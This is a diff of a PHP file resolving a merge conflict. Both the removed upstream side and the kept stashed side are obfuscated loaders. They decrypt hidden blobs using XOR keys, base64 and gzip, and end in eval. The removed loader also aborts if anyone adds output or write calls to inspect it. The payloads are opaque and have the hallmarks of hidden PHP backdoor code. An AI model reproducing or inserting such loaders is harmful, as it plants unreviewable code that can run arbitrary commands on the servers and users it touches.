@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$bpaeovy="831e957ff6e96069eef3c9e07a649587";
-$hqwmmgij="080606040d5701575103575b010957095d5053025b5d04525359020608010a56";
-$gqoiztmq="SO+6NFkJ7QEnyyyqSIEjEU5j2UdofEy7b9GOPAsc6QEvo1Y1z570Ve6m1g5Szd7fzKfhR4o08CL0pk/ciNOW6lAAnfeRatnrQUCx3nKQT5er3BGv98Ny+qePcsA9or+pm5ekLWPvtuqxUBqPhsDIECUp0oORhdbv34ONsY3Wmm0Iq3kz+vZErblHCJt8ftVqYZisd2j+KTBcTqCCMeVDDyUsozJR9H3c5MkdnW7t990O1Zh15S1gLi7OBBj42l/xgaLjvEfw1CTSqHpPo2q/EEwlGu+UTuYiRfcbHAfuvXd+SO/mrYdDPeeiffLwdNRWJQb/i36z52dwkCeFouw44oAi38iaq0azUaAmtumZ9GgcJ25/VWoHk05gUR1n1XisH5fOEAhZtyhKptaY1NSaFDF2vVEuIzCOmLFZUCT7WhoQsGen6LtTbpvE0qrDAqAPrecf2RFuFg7sW8zerfwCBi3i/XGsEv4rY1eUo+UlUb/UjceAO0NndDYmT2VNb/p2fABIYXKbgtZk9bT19+EIlBQCwmHay+9Anx7b5G+d9vM0iO+RRJ2pavUS5FhYRXiKGUJvmzzNU5nIrKJve/ha1TjxO9InChJFPYJ3bR+G99gQSteyumTC4N6SbritsWJSraMjqj7uViHBkJsff2R0lb5OMULpVivwgxBlYq8DsemX8j9EjYxF4fqeqVfhLfGIpZj5mWeYkTdJwknbyEHSMA3bLH4rMlnf6l1Mzi7WjfTiAgOfPkWC61UkVumgBdqQ/tHHnevlofWsMbm1x8udxMxRQQtO6gEZNFHt+4WAlQbTBuZVwysdKrpjlmGK48BgulWnuDp5Ay12HmbW+HKj5r1kLlO6UOdk2r38FRyr7YvZUzRFoxVmMe381kSiyAq13BBwRxUHX7jsDCKyjPFaPgEIJLxyM8Nq+887oiuCl0Dr5vqQWZfJbmkvT5w2oHY93w==";
-$mxfwrhht=file_get_contents(__FILE__);
-$ipxojp=str_replace($gqoiztmq,"",$mxfwrhht);
-if(strpos($ipxojp,"ec"."ho")!==false||strpos($ipxojp,"pr"."int")!==false||strpos($ipxojp,"var_"."dump")!==false||strpos($ipxojp,"file_put_"."contents")!==false||strpos($ipxojp,"fw"."rite")!==false){die();}
-$ryqnylho=str_replace(array($bpaeovy,$hqwmmgij),array("SP_0bf5e05a","KP_e87c686e"),$mxfwrhht);
-$kgljzg=md5($ryqnylho);
-$mkitahu=hex2bin($hqwmmgij);
-$cubybzrve="";
-$joxdqaweesch=strlen($kgljzg);
-for($fceiwlsb=0;$fceiwlsb<$joxdqaweesch;$fceiwlsb++){
-$cubybzrve.=chr(ord($mkitahu[$fceiwlsb])^ord($kgljzg[$fceiwlsb]));
-}
-$smhyntkvj=base64_decode($gqoiztmq);
-$lblvgwact=strlen($smhyntkvj);
-$qrmwtoa="";
-$zzynstoof=strlen($cubybzrve);
-for($fceiwlsb=0;$fceiwlsb<$lblvgwact;$fceiwlsb++){
-$qrmwtoa.=$smhyntkvj[$fceiwlsb]^$cubybzrve[$fceiwlsb%$zzynstoof];
-}
-$drnwgeu="gzun"."compress";
-eval($drnwgeu($qrmwtoa));
-=======
 // 8db2933a1a28fce71da0e250
 $xwrqfJoGsiA="Q85XNog7y5kfBRjivKts9Q/khNYpKAJiUX/Tli2LrbU=";
 $ysVlEGGXPo="D85KAbt7l5xsOEwviXgf9D/xuALcXNWvHK/Gyv2YeoH=";
@@ -52,4 +27,3 @@ $uhWncAHILaF=$JqoKUHHog($uhWncAHILaF);
 $uhWncAHILaF=$Iw_vTnsCPcCW($uhWncAHILaF);
 $uhWncAHILaF=$oDWplwWFxE($uhWncAHILaF);
 eval($uhWncAHILaF);
->>>>>>> Stashed changes
